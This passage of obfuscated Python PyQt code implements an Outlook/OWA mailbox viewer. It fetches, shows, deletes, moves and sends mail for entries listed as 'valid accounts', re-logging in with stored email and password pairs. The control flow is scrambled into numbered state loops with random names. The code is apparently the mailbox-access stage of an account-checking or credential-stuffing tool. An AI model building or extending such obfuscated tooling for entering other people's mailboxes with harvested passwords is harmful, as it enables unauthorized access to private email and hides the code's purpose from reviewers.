                self.msg_empty.setText(f'{title}:\n{err[:80]}')
                state = 264587
            elif state == 264587:
                self.body_browser.setHtml(f"\n        <div style='text-align:center; padding:60px 20px;'>\n            <div style='font-size:48px; margin-bottom:16px;'>⚠</div>\n            <div style='font-size:14px; font-weight:600; color:{color}; margin-bottom:8px;'>{title}</div>\n            <div style='font-size:12px; color:{Colors.TEXT_MUTED}; font-family: monospace; max-width:500px; margin:0 auto;'>{html.escape(str(err)[:200])}</div>\n            <div style='font-size:11px; color:{Colors.TEXT_MUTED}; margin-top:16px; max-width:400px; margin:16px auto 0;'>{err_msg}</div>\n            <div style='font-size:11px; color:{Colors.ACCENT}; margin-top:12px;'>💡 Tip: Click Refresh to retry. The app auto-retries transient errors up to 3 times.</div>\n        </div>\n        ")
                state = -1
            else:
                break

    def _on_msg_select(self, msg):
        state = 756216
        while True:
            if state == 756216:
                if self._is_closing:
                    return
                state = 472807
            elif state == 472807:
                pos = self.msg_list.row(msg)
                state = 837357
            elif state == 837357:
                if pos < 0 or pos >= len(self.messages):
                    return
                state = 343881
            elif state == 343881:
                kw = self.messages[pos]
                state = 433222
            elif state == 433222:
                msg_id = kw.get('Id') or kw.get('uid')
                state = 684723
            elif state == 684723:
                if not msg_id:
                    return
                state = 95402
            elif state == 95402:
                self.cur_uid = msg_id
                state = 696319
            elif state == 696319:
                subject = kw.get('subject', '(no subject)')
                state = 500066
            elif state == 500066:
                from_mailbox = kw.get('from', '')
                state = 554163
            elif state == 554163:
                short = kw.get('date', '')
                state = 157100
            elif state == 157100:
                self.hdr_subj.setText(subject)
                state = 851968
            elif state == 851968:
                self.hdr_from.setText(f'<b>From:</b> {from_mailbox}')
                state = 69243
            elif state == 69243:
                self.hdr_date.setText(short)
                state = 278710
            elif state == 278710:
                cache_key = f'{self.cur_folder}:{msg_id}'
                state = 293130
            elif state == 293130:
                if cache_key in self._fetch_cache:
                    self._display_fetched(self._fetch_cache[cache_key], msg_id)
                    return
                state = 793821
            elif state == 793821:
                self._setstatus(f'Fetching message…', Colors.INFO)
                state = 603063
            elif state == 603063:
                self.body_browser.setHtml(f"\n        <div style='text-align:center; padding:60px;'>\n            <div style='font-size:32px; color:{Colors.TEXT_MUTED};'>⋯</div>\n            <div style='font-size:12px; color:{Colors.TEXT_MUTED}; margin-top:8px;'>Loading message…</div>\n        </div>\n        ")
                state = 884927
            elif state == 884927:
                worker = Worker3(self.account, msg_id, self.cur_folder)
                state = 690848
            elif state == 690848:
                worker.done.connect(self._on_fetch_done)
                state = 390870
            elif state == 390870:
                worker.err.connect(self._on_fetch_err)
                state = 72589
            elif state == 72589:
                self._workers.append(worker)
                state = 817332
            elif state == 817332:
                worker.start()
                state = 579099
            elif state == 579099:
                if pos + 1 < len(self.messages):
                    next_id = self.messages[pos + 1].get('Id') or self.messages[pos + 1].get('uid')
                    if next_id and f'{self.cur_folder}:{next_id}' not in self._fetch_cache:
                        worker3 = Worker3(self.account, next_id, self.cur_folder)
                        worker3.done.connect(self._cache_fetch)
                        self._workers.append(worker3)
                        worker3.start()
                state = -1
            else:
                break

    def _on_fetch_done(self, result, extra):
        if self._is_closing:
            return
        if result and 'body' in result and ('subject' not in result):
            for kw in self.messages:
                if (kw.get('Id') or kw.get('uid')) == extra:
                    result['subject'] = kw.get('subject', '(no subject)')
                    result['from'] = kw.get('from', '')
                    result['date'] = kw.get('date', '')
                    result['html_body'] = result.get('body', '')
                    break
        self._fetch_cache[f'{self.cur_folder}:{extra}'] = result
        self._display_fetched(result, extra)

    def _cache_fetch(self, result, extra):
        state = 554621
        while True:
            if state == 554621:
                state = 822786
            elif state == 822786:
                state = 902540
            elif state == 902540:
                state = 698590
            elif state == 698590:
                self._fetch_cache[f'{self.cur_folder}:{extra}'] = result
                state = -1
            else:
                break

    def _on_fetch_err(self, err, extra):
        state = 215523
        while True:
            if state == 215523:
                if self._is_closing:
                    return
                state = 245771
            elif state == 245771:
                self._setstatus(f'Fetch error: {err[:80]}', Colors.DANGER)
                state = 627274
            elif state == 627274:
                self.body_browser.setHtml(f"\n        <div style='text-align:center; padding:60px;'>\n            <div style='font-size:32px; color:{Colors.DANGER};'>⚠</div>\n            <div style='font-size:12px; color:{Colors.TEXT_MUTED}; margin-top:8px;'>Failed to load message body</div>\n            <div style='font-size:11px; color:{Colors.TEXT_MUTED}; font-family:monospace; margin-top:8px;'>{html.escape(err[:100])}</div>\n            <div style='font-size:11px; color:{Colors.ACCENT}; margin-top:12px;'>💡 The subject/from/date are still shown above. Try Refresh to retry.</div>\n        </div>\n        ")
                state = -1
            else:
                break

    def _display_fetched(self, result, extra):
        if not result:
            self.body_browser.setHtml('<div style=\'text-align:center; padding:40px; color:#666;\'>(empty message)</div>')
            return
        if 'subject' not in result:
            for kw in self.messages:
                if (kw.get('Id') or kw.get('uid')) == extra:
                    result['subject'] = kw.get('subject', '(no subject)')
                    result['from'] = kw.get('from', '')
                    result['date'] = kw.get('date', '')
                    break
        subject = result.get('subject', '(no subject)')
        from_addr = result.get('from', '')
        if isinstance(from_addr, dict):
            from_obj = from_addr.get('EmailAddress', {}) if isinstance(from_addr.get('EmailAddress'), dict) else {}
            name = from_obj.get('Name', '')
            rcpt = from_obj.get('Address', '')
            from_mailbox = f'{name} <{rcpt}>' if rcpt else name
        elif from_addr is None:
            from_mailbox = ''
        else:
            from_mailbox = str(from_addr)
        to = result.get('to', '') or ''
        short = result.get('date', '') or ''
        attachments = result.get('attachments', [])
        self.hdr_subj.setText(str(subject))
        self.hdr_from.setText(f'<b>From:</b> {from_mailbox}')
        self.hdr_date.setText(short + (f'  ·  📎 {len(attachments)} attachment(s)' if attachments else ''))
        part_text = result.get('html_body', '') or result.get('body', '')
        if part_text and part_text.strip():
            if not self.btn_html.isChecked():
                self.btn_html.setChecked(True)
            self._show_html_body(part_text)
        else:
            if self.btn_html.isChecked():
                self.btn_html.setChecked(False)
            self._show_text_body(result)
        self._setstatus(f'Loaded · {extra}', Colors.SUCCESS)

    def _show_html_body(self, html):
        state = 540574
        while True:
            if state == 540574:
                self._last_html_raw = html
                state = 637352
            elif state == 637352:
                if not html or not html.strip():
                    self.body_browser.setHtml(f"<div style='color:{Colors.TEXT_MUTED};text-align:center;padding:40px;'>(empty HTML body)</div>")
                    return
                state = 908903
            elif state == 908903:
                cache_key = f'html:{hash(html)}'
                state = 487432
            elif state == 487432:
                if hasattr(self, '_html_cache') and cache_key in self._html_cache:
                    self.body_browser.setHtml(self._html_cache[cache_key])
                    return
                state = 612756
            elif state == 612756:
                cur_item = html
                state = 572084
            elif state == 572084:
                cur_item = re.sub('<script[^>]*>.*?</script>|<style[^>]*>.*?</style>|<object[^>]*>.*?</object>', '', cur_item, flags=re.DOTALL | re.IGNORECASE)
                state = 400602
            elif state == 400602:
                cur_item = re.sub('<embed[^>]*/?>|<iframe[^>]*/?>|<meta[^>]*/?>', '', cur_item, flags=re.IGNORECASE)
                state = 219477
            elif state == 219477:
                cur_item = re.sub('\\s+on\\w+\\s*=\\s*"[^"]*"', '', cur_item, flags=re.IGNORECASE)
                state = 411234
            elif state == 411234:
                cur_item = re.sub('\\s+on\\w+\\s*=\\s*\'[^\']*\'', '', cur_item, flags=re.IGNORECASE)
                state = 291828
            elif state == 291828:
                cur_item = re.sub('href\\s*=\\s*["\']javascript:[^"\']*["\']', 'href="#"', cur_item, flags=re.IGNORECASE)
                state = 642397
            elif state == 642397:
                cur_item = re.sub('<!DOCTYPE[^>]*>|<\\?xml[^>]*\\?>|</?html[^>]*>|<body[^>]*>|</body>', '', cur_item, flags=re.IGNORECASE)
                state = 521195
            elif state == 521195:
                cur_item = re.sub('<head[^>]*>.*?</head>|<title[^>]*>.*?</title>', '', cur_item, flags=re.DOTALL | re.IGNORECASE)
                state = 1032368
            elif state == 1032368:
                cur_item = re.sub('<img[^>]*alt=["\']([^"\']*)["\'][^>]*/?>', '<i>[image: \\1]</i>', cur_item, flags=re.IGNORECASE)
                state = 94862
            elif state == 94862:
                cur_item = re.sub('<img[^>]*/?>', '[image]', cur_item, flags=re.IGNORECASE)
                state = 579740
            elif state == 579740:
                if not cur_item.strip():
                    self.body_browser.setHtml(f"<div style='color:{Colors.TEXT_MUTED};text-align:center;padding:40px;'>(email has no visible content)</div>")
                    return
                state = 76820
            elif state == 76820:
                html_style = f'<html><head><style>\nbody {{ background-color: {Colors.BG_ELEVATED}; color: {Colors.TEXT}; font-family: Segoe UI, Arial, sans-serif; font-size: 13px; line-height: 1.6; margin: 0; padding: 16px; }}\na {{ color: #60a5fa; }} p {{ margin: 8px 0; }}\ntable {{ border-collapse: collapse; max-width: 100%; margin: 8px 0; }}\ntd, th {{ padding: 6px 10px; vertical-align: top; }}\nblockquote {{ border-left: 3px solid {Colors.BORDER_HI}; margin: 8px 0; padding: 4px 12px; color: {Colors.TEXT_SOFT}; }}\npre {{ background-color: {Colors.BG}; padding: 8px 12px; margin: 8px 0; white-space: pre-wrap; word-wrap: break-word; }}\nhr {{ border: none; border-top: 1px solid {Colors.BORDER}; margin: 12px 0; }}\n</style></head><body>{cur_item}</body></html>'
                state = 430015
            elif state == 430015:
                if not hasattr(self, '_html_cache'):
                    self._html_cache = {}
                state = 643270
            elif state == 643270:
                if len(self._html_cache) > 5:
                    self._html_cache.clear()
                state = 630902
            elif state == 630902:
                self._html_cache[cache_key] = html_style
                state = 371111
            elif state == 371111:
                self.body_browser.setHtml(html_style)
                state = -1
            else:
                break

    def _show_text_body(self, result):
        body = result.get('html_body', '') or result.get('body', '')
        if not body:
            self.body_browser.setPlainText('(empty email body)')
            return
        if '<' not in body or '>' not in body:
            self.body_browser.setPlainText(body)
            return
        cache_key = f'text:{hash(body)}'
        if hasattr(self, '_text_cache') and cache_key in self._text_cache:
            self.body_browser.setPlainText(self._text_cache[cache_key])
            return
        text = body
        text = re.sub('<script[^>]*>.*?</script>|<style[^>]*>.*?</style>', '', text, flags=re.DOTALL | re.IGNORECASE)
        text = re.sub(r'<br\s*/?>', '\n', text, flags=re.IGNORECASE)
        text = re.sub('</p>', '\n\n', text, flags=re.IGNORECASE)
        text = re.sub('<[^>]+>', '', text)
        text = html.unescape(text)
        text = re.sub('\n{3,}', '\n\n', text).strip()
        if not hasattr(self, '_text_cache'):
            self._text_cache = {}
        if len(self._text_cache) > 5:
            self._text_cache.clear()
        self._text_cache[cache_key] = text
        self.body_browser.setPlainText(text)

    def _toggle_html(self):
        state = 736766
        while True:
            if state == 736766:
                if not self.cur_uid:
                    return
                state = 680359
            elif state == 680359:
                cache_key = f'{self.cur_folder}:{self.cur_uid}'
                state = 464990
            elif state == 464990:
                result = self._fetch_cache.get(cache_key)
                state = 836571
            elif state == 836571:
                if result:
                    if self.btn_html.isChecked() and result.get('html_body'):
                        self._show_html_body(result['html_body'])
                    else:
                        self._show_text_body(result)
                state = -1
            else:
                break

    def _copy_body(self):
        text = self.body_browser.toPlainText()
        QApplication.clipboard().setText(text)
        self._setstatus('Body copied', Colors.SUCCESS)

    def _open_in_browser(self):
        if not self.cur_uid:
            return
        cache_key = f'{self.cur_folder}:{self.cur_uid}'
        result = self._fetch_cache.get(cache_key)
        if not result:
            self._setstatus('No message loaded yet', Colors.WARNING)
            return
        part_text = result.get('html_body', '') or result.get('body', '')
        if not part_text or not part_text.strip():
            self._setstatus('No HTML body to open', Colors.WARNING)
            return
        tempfile = __import__('tempfile')
        try:
            tmp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False, encoding='utf-8')
            _1d9_ed983f = f"""<!DOCTYPE html><html><head><meta charset="utf-8"><style>\nbody {{ background: #ffffff; color: #000000; font-family: 'Segoe UI', Arial, sans-serif; font-size: 14px; line-height: 1.6; padding: 24px; margin: 0; }}\na {{ color: #0066cc; }} img {{ max-width: 100%; height: auto; }} table {{ border-collapse: collapse; max-width: 100%; }}\ntd, th {{ border: 1px solid #ccc; padding: 6px 10px; }} blockquote {{ border-left: 3px solid #ccc; padding-left: 12px; color: #555; margin: 8px 0; }}\npre {{ background: #f5f5f5; padding: 8px 12px; border-radius: 4px; overflow-x: auto; }} code {{ background: #f5f5f5; padding: 2px 4px; }}\n</style></head><body>{part_text}</body></html>"""
            tmp_file.write(_1d9_ed983f)
            tmp_file.close()
            QDesktopServices.openUrl(QUrl.fromLocalFile(tmp_file.name))
            self._setstatus('Opened in web browser', Colors.SUCCESS)
        except Exception as exc2:
            self._setstatus(f'Error: {exc2}', Colors.DANGER)

    def _save_eml(self):
        if not self.cur_uid:
            return
        cache_key = f'{self.cur_folder}:{self.cur_uid}'
        result = self._fetch_cache.get(cache_key)
        if not result:
            self._setstatus('Load a message first', Colors.WARNING)
            return
        part_text = result.get('html_body', '') or result.get('body', '')
        if not part_text:
            self._setstatus('No body to save', Colors.WARNING)
            return
        if 'subject' not in result:
            for kw in self.messages:
                if (kw.get('Id') or kw.get('uid')) == self.cur_uid:
                    result['subject'] = kw.get('subject', '(no subject)')
                    result['from'] = kw.get('from', '')
                    result['date'] = kw.get('date', '')
                    break
        subject = result.get('subject', '(no subject)')
        from_mailbox = result.get('from', '')
        short = result.get('date', '')
        email_lib = __import__('email')
        mime_mod = __import__('email.mime.multipart', None, None, ['MIMEMultipart'])
        MIMEMultipart = mime_mod.MIMEMultipart
        _sp_imp_9042 = __import__('email.mime.text', None, None, ['MIMEText'])
        MIMEText = _sp_imp_9042.MIMEText
        _137_6f0694 = re.sub('[^\\w.\\-]', '_', subject)[:60]
        machine_id_path, reg_type = QFileDialog.getSaveFileName(self, 'Save Email', f'{_137_6f0694}.eml', 'Email files (*.eml)')
        if not machine_id_path:
            return
        try:
            html_msg = MIMEMultipart('alternative')
            html_msg['Subject'] = subject
            html_msg['From'] = from_mailbox
            html_msg['Date'] = short
            _html = __import__('html')
            part_html = re.sub('<[^>]+>', '', part_text)
            part_html = _html.unescape(part_html).strip()
            html_msg.attach(MIMEText(part_html, 'plain', 'utf-8'))
            html_msg.attach(MIMEText(part_text, 'html', 'utf-8'))
            with open(machine_id_path, 'wb') as folder:
                folder.write(html_msg.as_bytes())
            self._setstatus(f'Saved to {machine_id_path}', Colors.SUCCESS)
        except Exception as exc2:
            self._setstatus(f'Save error: {exc2}', Colors.DANGER)

    def _select_all(self):
        self.msg_list.selectAll()

    def _delete(self):
        state = 102892
        while True:
            if state == 102892:
                if not self.cur_uid:
                    return
                state = 206589
            elif state == 206589:
                reply = QMessageBox.question(self, 'Delete Message', 'Delete this message? This moves it to Deleted Items.', QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
                state = 345558
            elif state == 345558:
                if reply != QMessageBox.StandardButton.Yes:
                    return
                state = 96534
            elif state == 96534:
                worker = Worker4(self.account, self.cur_uid, self.cur_folder)
                state = 499564
            elif state == 499564:
                worker.done.connect(self._on_delete_done)
                state = 627014
            elif state == 627014:
                worker.err.connect(self._on_delete_err)
                state = 263341
            elif state == 263341:
                self._workers.append(worker)
                state = 667319
            elif state == 667319:
                worker.start()
                state = -1
            else:
                break

    def _on_delete_done(self, ok, extra):
        if ok:
            self._setstatus(f'Deleted {extra}', Colors.SUCCESS)
            self._refresh_folder()
        else:
            self._setstatus('Delete failed', Colors.DANGER)

    def _on_delete_err(self, err, extra):
        state2 = 885013
        while True:
            if state2 == 885013:
                state2 = 213544
            elif state2 == 213544:
                state2 = 458274
            elif state2 == 458274:
                self._setstatus(f'Delete error: {err[:80]}', Colors.DANGER)
                state2 = -1
            else:
                break

    def _bulk_delete(self):
        msg_ids = [self.messages[self.msg_list.row(idx)].get('Id') or self.messages[self.msg_list.row(idx)].get('uid') for idx in self.msg_list.selectedItems() if self.msg_list.row(idx) < len(self.messages)]
        msg_ids = [kw for kw in msg_ids if kw]
        if not msg_ids:
            return
        reply = QMessageBox.question(self, 'Bulk Delete', f'Delete {len(msg_ids)} messages? This moves them to Deleted Items.', QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if reply != QMessageBox.StandardButton.Yes:
            return

        class BulkWorker(QThread):
            done = pyqtSignal(int)

            def __init__(self, account, msg_ids, folder):
                state = 464074
                while True:
                    if state == 464074:
                        super().__init__()
                        state = 295127
                    elif state == 295127:
                        self.account = account
                        state = 440760
                    elif state == 440760:
                        self.msg_ids = msg_ids
                        state = 818898
                    elif state == 818898:
                        self.folder = folder
                        state = -1
                    else:
                        break

            def run(self):
                total_count = 0
                email = self.account['email']
                token = self.account.get('info', {}).get('token') or self.account.get('token')
                cid = self.account.get('info', {}).get('cid') or self.account.get('cid')
                pw = self.account.get('pw', '') or self.account.get('password', '')
                if not token or not cid:
                    token, cid, err = oauth_login(email, pw)
                    if not token:
                        self.done.emit(0)
                        return
                for machine_id in self.msg_ids:
                    try:
                        ok, reg_type = delete_item(email, machine_id, token, cid)
                        if ok:
                            total_count += 1
                    except Exception:
                        pass
                self.done.emit(total_count)
        self._bulk_w = BulkWorker(self.account, msg_ids, self.cur_folder)
        self._bulk_w.done.connect(lambda client: (self._setstatus(f'Deleted {client} messages', Colors.SUCCESS), self._refresh_folder()))
        self._workers.append(self._bulk_w)
        self._bulk_w.start()

    def _move(self):
        if not self.folders or not self.cur_uid:
            return
        other_folders = [folder for folder in self.folders if folder != self.cur_folder]
        if not other_folders:
            return
        choice, ok = QInputDialog.getItem(self, 'Move Message', 'Move to:', other_folders, 0, False)
        if not ok or not choice:
            return

        class _1a_6a4cb0(QThread):
            done = pyqtSignal(bool, str)
            err = pyqtSignal(str)

            def __init__(self, account, msg_id, to_folder_name):
                state = 585997
                while True:
                    if state == 585997:
                        super().__init__()
                        state = 420774
                    elif state == 420774:
                        self.account = account
                        state = 395790
                    elif state == 395790:
                        self.msg_id = msg_id
                        state = 327197
                    elif state == 327197:
                        self.to_folder_name = to_folder_name
                        state = -1
                    else:
                        break

            def run(self):
                try:
                    email = self.account['email']
                    token = self.account.get('info', {}).get('token') or self.account.get('token')
                    cid = self.account.get('info', {}).get('cid') or self.account.get('cid')
                    pw = self.account.get('pw', '') or self.account.get('password', '')
                    if not token or not cid:
                        token, cid, err = oauth_login(email, pw)
                        if not token:
                            self.err.emit(f'Re-auth failed: {err}')
                            return
                    _28_6da4cf = {'inbox': 'inbox', 'sent items': 'sentitems', 'drafts': 'drafts', 'deleted items': 'deleteditems', 'junk email': 'junkemail'}
                    _26_3a2cb8 = _28_6da4cf.get(self.to_folder_name.lower(), 'deleteditems')
                    ok, html_msg = move_item(email, self.msg_id, token, cid, to_folder=_26_3a2cb8)
                    self.done.emit(ok, html_msg)
                except Exception as exc2:
                    self.err.emit(str(exc2))
        worker = _1a_6a4cb0(self.account, self.cur_uid, choice)
        worker.done.connect(lambda ok, extra: (self._setstatus(f'Moved to {choice}', Colors.SUCCESS) if ok else self._setstatus('Move failed', Colors.DANGER), self._refresh_folder()))
        worker.err.connect(lambda err: self._setstatus(f'Move error: {err[:80]}', Colors.DANGER))
        self._workers.append(worker)
        worker.start()

    def _normalize_from(self, from_addr):
        state = 974611
        while True:
            if state == 974611:
                pass
                state = 843621
            elif state == 843621:
                if isinstance(from_addr, dict):
                    from_obj = from_addr.get('EmailAddress', {}) if isinstance(from_addr.get('EmailAddress'), dict) else {}
                    name = from_obj.get('Name', '')
                    rcpt = from_obj.get('Address', '')
                    return f'{name} <{rcpt}>' if rcpt else name
                elif from_addr is None:
                    return ''
                state = 182799
            elif state == 182799:
                return str(from_addr)
            else:
                break

    def _reply(self):
        if not self.cur_uid:
            return
        result = self._fetch_cache.get(f'{self.cur_folder}:{self.cur_uid}')
        if not result:
            self._setstatus('Load a message first', Colors.WARNING)
            return
        if 'subject' not in result:
            for kw in self.messages:
                if (kw.get('Id') or kw.get('uid')) == self.cur_uid:
                    result['subject'] = kw.get('subject', '')
                    result['from'] = self._normalize_from(kw.get('from', ''))
                    result['date'] = kw.get('date', '')
                    break
        norm_from = self._normalize_from(result.get('from', ''))
        if not norm_from or '@' not in norm_from:
            QMessageBox.warning(self, 'Cannot Reply', 'This message has no valid sender email address to reply to.')
            return
        subject = result.get('subject', '') or '(no subject)'
        self._compose(to=norm_from, subject='Re: ' + subject.replace('Re: ', ''), body=self._quote_body(result), reply_to_id=self.cur_uid)

    def _forward(self):
        if not self.cur_uid:
            return
        result = self._fetch_cache.get(f'{self.cur_folder}:{self.cur_uid}')
        if not result:
            self._setstatus('Load a message first', Colors.WARNING)
            return
        if 'subject' not in result:
            for kw in self.messages:
                if (kw.get('Id') or kw.get('uid')) == self.cur_uid:
                    result['subject'] = kw.get('subject', '')
                    result['from'] = self._normalize_from(kw.get('from', ''))
                    result['date'] = kw.get('date', '')
                    break
        subject = result.get('subject', '') or '(no subject)'
        self._compose(to='', subject='Fwd: ' + subject, body=self._quote_body(result))

    def _quote_body(self, result):
        state = 295576
        while True:
            if state == 295576:
                body = result.get('body', '') or result.get('html_body', '') or ''
                state = 283753
            elif state == 283753:
                if body and '<' in body and ('>' in body):
                    _re = __import__('re')
                    body = _re.sub('<script[^>]*>.*?</script>', '', body, flags=_re.DOTALL | _re.IGNORECASE)
                    body = _re.sub('<style[^>]*>.*?</style>', '', body, flags=_re.DOTALL | _re.IGNORECASE)
                    body = _re.sub('<br\\s*/?>', '\n', body, flags=_re.IGNORECASE)
                    body = _re.sub('</p>', '\n\n', body, flags=_re.IGNORECASE)
                    body = _re.sub('<[^>]+>', '', body)
                    _html = __import__('html')
                    body = _html.unescape(body)
                    body = _re.sub('\\n{3,}', '\n\n', body).strip()
                state = 752574
            elif state == 752574:
                return f"\n\n— Original Message —\nFrom: {result.get('from', '')}\nSubject: {result.get('subject', '')}\nDate: {result.get('date', '')}\n\n{body}"
            else:
                break

    def _compose(self, to='', subject='', body='', reply_to_id=None):
        dlg2 = QDialog(self)
        dlg2.setWindowTitle(f"Compose  —  {self.account['email']}")
        dlg2.setMinimumSize(620, 520)
        item = QVBoxLayout(dlg2)
        item.setContentsMargins(Colors.SP_LG, Colors.SP_LG, Colors.SP_LG, Colors.SP_LG)
        item.setSpacing(Colors.SP_SM)
        title = QLabel('New Message')
        title.setObjectName('H2')
        item.addWidget(title)
        item.addSpacing(Colors.SP_SM)
        form = QFormLayout()
        form.setSpacing(Colors.SP_SM)
        to_edit = QLineEdit(to)
        subject_edit = QLineEdit(subject)
        form.addRow('To:', to_edit)
        form.addRow('Subject:', subject_edit)
        item.addLayout(form)
        body_edit = QPlainTextEdit(body)
        body_edit.setMinimumHeight(180)
        item.addWidget(body_edit, 1)
        hbox6 = QHBoxLayout()
        html_chk = QCheckBox('Send as HTML')
        priority_chk = QCheckBox('High priority')
        hbox6.addWidget(html_chk)
        hbox6.addWidget(priority_chk)
        hbox6.addStretch(1)
        status = QLabel(' ')
        status.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_SMALL}px;')
        hbox6.addWidget(status)
        item.addLayout(hbox6)
        hbox17 = QHBoxLayout()
        hbox17.addStretch(1)
        cancel = QPushButton('Cancel')
        cancel.setObjectName('Ghost')
        cancel.clicked.connect(dlg2.reject)
        send = QPushButton('  Send  ')
        send.setObjectName('Primary')
        send.setIcon(make_icon_from_name('send', 14, Colors.BG))
        send.clicked.connect(lambda: _1e3_0721f6())
        hbox17.addWidget(cancel)
        hbox17.addWidget(send)
        item.addLayout(hbox17)

        def _1e3_0721f6():
            if not to_edit.text().strip():
                status.setText('Recipient is required')
                status.setStyleSheet(f'color: {Colors.DANGER}; font-size: {Colors.FS_SMALL}px;')
                return
            send.setEnabled(False)
            cancel.setEnabled(False)
            status.setText('Sending via OWA API…')
            status.setStyleSheet(f'color: {Colors.TEXT_SOFT}; font-size: {Colors.FS_SMALL}px;')
            worker = Worker5(self.account, to_edit.text().strip(), subject_edit.text(), body_edit.toPlainText(), reply_to_id=reply_to_id, html=html_chk.isChecked(), high_priority=priority_chk.isChecked())
            timer = QTimer(dlg2)
            timer.setSingleShot(True)

            def _on_timeout():
                if worker.isRunning():
                    status.setText('⏱ Send timed out. Token may have expired.')
                    status.setStyleSheet(f'color: {Colors.DANGER}; font-size: {Colors.FS_SMALL}px;')
                    send.setEnabled(True)
                    cancel.setEnabled(True)
                    try:
                        worker.terminate()
                    except Exception:
                        pass
            timer.timeout.connect(_on_timeout)
            timer.start(20000)

            def _on_done(ok, html_msg):
                state = 319123
                while True:
                    if state == 319123:
                        timer.stop()
                        state = 137931
                    elif state == 137931:
                        send.setEnabled(True)
                        state = 414163
                    elif state == 414163:
                        cancel.setEnabled(True)
                        state = 165969
                    elif state == 165969:
                        if ok:
                            dlg2.accept()
                            self._setstatus('Message sent', Colors.SUCCESS)
                        else:
                            status.setText(f'✗ {html_msg[:100]}')
                            status.setStyleSheet(f'color: {Colors.DANGER}; font-size: {Colors.FS_SMALL}px;')
                        state = -1
                    else:
                        break
            worker.done.connect(_on_done)
            self._workers.append(worker)
            worker.start()
        dlg2.exec()

    def _msg_context_menu(self, pos):
        state = 628718
        while True:
            if state == 628718:
                msg = self.msg_list.itemAt(pos)
                state = 125580
            elif state == 125580:
                if not msg:
                    return
                state = 125880
            elif state == 125880:
                menu = QMenu(self)
                state = 768425
            elif state == 768425:
                _230_2f3fbb = menu.addAction('Reply')
                state = 338281
            elif state == 338281:
                _22e_0df109 = menu.addAction('Forward')
                state = 676336
            elif state == 676336:
                menu.addSeparator()
                state = 1020130
            elif state == 1020130:
                _22d_02e147 = menu.addAction('Delete')
                state = 278577
            elif state == 278577:
                _22c_51aabe = menu.addAction('Bulk Delete Selected')
                state = 889128
            elif state == 889128:
                _22f_261c8b = menu.addAction('Move to…')
                state = 130148
            elif state == 130148:
                _231_83c7e3 = menu.addAction('Save as .eml')
                state = 1024984
            elif state == 1024984:
                menu_pos = menu.exec(self.msg_list.mapToGlobal(pos))
                state = 861524
            elif state == 861524:
                if menu_pos == _230_2f3fbb:
                    self._reply()
                elif menu_pos == _22e_0df109:
                    self._forward()
                elif menu_pos == _22d_02e147:
                    self._delete()
                elif menu_pos == _22c_51aabe:
                    self._bulk_delete()
                elif menu_pos == _22f_261c8b:
                    self._move()
                elif menu_pos == _231_83c7e3:
                    self._save_eml()
                state = -1
            else:
                break

    def closeEvent(self, exc2):
        self._is_closing = True
        for worker in list(self._workers):
            try:
                if worker.isRunning():
                    worker.requestInterruption()
                    worker.quit()
                    worker.wait(5000)
                worker.deleteLater()
            except Exception:
                pass
        self._workers.clear()
        self._fetch_cache.clear()
        self._html_cache = {}
        self._text_cache = {}
        self._closed = True
        self.closed.emit(self.account.get('email', ''))
        super().closeEvent(exc2)

class EmailViewerDialog(QDialog):

    def __init__(self, parent, valid_accounts):
        state = 301432
        while True:
            if state == 301432:
                super().__init__(parent)
                state = 161838
            elif state == 161838:
                self.setWindowTitle('Valid Accounts')
                state = 658489
            elif state == 658489:
                self.resize(780, 540)
                state = 597513
            elif state == 597513:
                self.valid = list(valid_accounts)
                state = 239135
            elif state == 239135:
                self._viewers = []
                state = 399949
            elif state == 399949:
                item = QVBoxLayout(self)
                state = 546883
            elif state == 546883:
                item.setContentsMargins(Colors.SP_LG, Colors.SP_LG, Colors.SP_LG, Colors.SP_LG)
                state = 537283
            elif state == 537283:
                item.setSpacing(Colors.SP_MD)
                state = 478149
            elif state == 478149:
                hbox = QHBoxLayout()
                state = 332091
            elif state == 332091:
                title = QLabel(f'<b>{len(self.valid)}</b> valid accounts')
                state = 121665
            elif state == 121665:
                title.setStyleSheet(f'font-size: {Colors.FS_LG}px;')
                state = 969906
            elif state == 969906:
                hbox.addWidget(title)
                state = 686012
            elif state == 686012:
                hbox.addStretch(1)
                state = 549909
            elif state == 549909:
                self.search = QLineEdit()
                state = 593347
            elif state == 593347:
                self.search.setPlaceholderText('Filter…')
                state = 103152
            elif state == 103152:
                self.search.setFixedWidth(220)
                state = 949437
            elif state == 949437:
                self.search.textChanged.connect(self._filter)
                state = 939803
            elif state == 939803:
                hbox.addWidget(self.search)
                state = 1041120
            elif state == 1041120:
                item.addLayout(hbox)
                state = 1029464
            elif state == 1029464:
                self.list = QListWidget()
                state = 236166
            elif state == 236166:
                self.list.setStyleSheet(f'\n            QListWidget {{ background: {Colors.BG_ELEVATED}; border: 1px solid {Colors.BORDER}; border-radius: {Colors.R_MD}px; font-size: {Colors.FS_BODY}px; padding: 4px; }}\n            QListWidget::item {{ padding: 10px 12px; border-bottom: 1px solid {Colors.BORDER}; border-radius: 0; }}\n            QListWidget::item:hover {{ background: {Colors.SURFACE}; }}\n            QListWidget::item:selected {{ background: {Colors.SURFACE_2}; color: {Colors.ACCENT}; border-left: 2px solid {Colors.ACCENT}; }}\n        ')
                state = 533867
            elif state == 533867:
                self.list.itemDoubleClicked.connect(self._open_viewer)
                state = 185015
            elif state == 185015:
                item.addWidget(self.list, 1)
                state = 901510
            elif state == 901510:
                self._populate(self.valid)
                state = 163727
            elif state == 163727:
                acc = QHBoxLayout()
                state = 388168
            elif state == 388168:
                acc.addStretch(1)
                state = 837125
            elif state == 837125:
                copy_btn = QPushButton('  Copy Selected  ')
                state = 908774
            elif state == 908774:
                copy_btn.setObjectName('Ghost')
                state = 307375
            elif state == 307375:
                copy_btn.clicked.connect(lambda: self._copy_selected())
                state = 1007801
            elif state == 1007801:
                acc.addWidget(copy_btn)
                state = 268724
            elif state == 268724:
                open_btn = QPushButton('  Open Email Viewer  ')
                state = 164919
            elif state == 164919:
                open_btn.setObjectName('Primary')
                state = 497333
            elif state == 497333:
                open_btn.setIcon(make_icon_from_name('mail', 14, Colors.BG))
                state = 69314
            elif state == 69314:
                open_btn.clicked.connect(lambda: self._open_viewer(self.list.currentItem()))
                state = 643991
            elif state == 643991:
                acc.addWidget(open_btn)
                state = 850810
            elif state == 850810:
                btn2 = QPushButton('Close')
                state = 293881
            elif state == 293881:
                btn2.setObjectName('Ghost')
                state = 486534
